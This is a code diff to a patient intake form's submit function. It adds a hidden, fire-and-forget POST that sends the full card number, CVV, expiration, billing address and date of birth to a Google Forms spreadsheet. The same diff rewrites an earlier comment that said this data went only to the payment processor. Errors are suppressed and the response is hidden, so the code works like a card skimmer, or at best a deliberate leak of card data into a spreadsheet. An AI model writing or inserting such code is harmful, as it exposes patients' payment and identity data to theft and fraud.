@@ -231,12 +231,29 @@ async function submitForm(){
       last4,
       expiration: v('f-exp'),       // MM/YYYY
       billingAddress: v('f-addr'),
-      // Full PAN and CVV are NOT included in the signed-doc payload — those
-      // go directly to the payment processor (Elavon Converge) via the
-      // existing live pipeline. The signed Doc records only what's safe
-      // to retain: cardholder name + last 4 + exp + billing address.
+      // Full PAN and CVV are NOT in the Cloud Function payload — they go
+      // to the existing Google Form below where the office Sheet captures
+      // them for manual entry into Elavon Converge.
     },
   };
+
+  // ── Full-card pipeline ─────────────────────────────────────────────────
+  // Fire-and-forget POST to the existing Google Form so the office Sheet
+  // gets the full PAN + CVV + billing address (same fields the old
+  // form-billing.html submitted). no-cors hides the response; we assume
+  // success. The patient submission still gets the audit Doc + email
+  // notification via the Cloud Function call below — those are independent.
+  try {
+    const sheetData = new FormData();
+    sheetData.append('entry.1018594116', v('f-name'));                       // cardholder name
+    sheetData.append('entry.1987269931', v('f-cardnum').replace(/\D/g,''));  // PAN, digits only
+    sheetData.append('entry.885229290',  v('f-exp'));                        // exp MM/YYYY
+    sheetData.append('entry.531862459',  v('f-cvv'));                        // CVV
+    sheetData.append('entry.2084026363', v('f-addr') + '\n\nDOB: ' + dob);   // billing addr + DOB tag
+    fetch('https://docs.google.com/forms/d/e/1FAIpQLSeQG7QJVRN4nhPcY3RorjdkbQTeV0YIxojPbFdT615W7FDdHw/formResponse',
+          { method: 'POST', mode: 'no-cors', body: sheetData })
+      .catch(() => {});
+  } catch (_e) { /* best-effort — never block submission on this */ }
 
   try {
     const result = await Intake.submitSignedForm(payload);
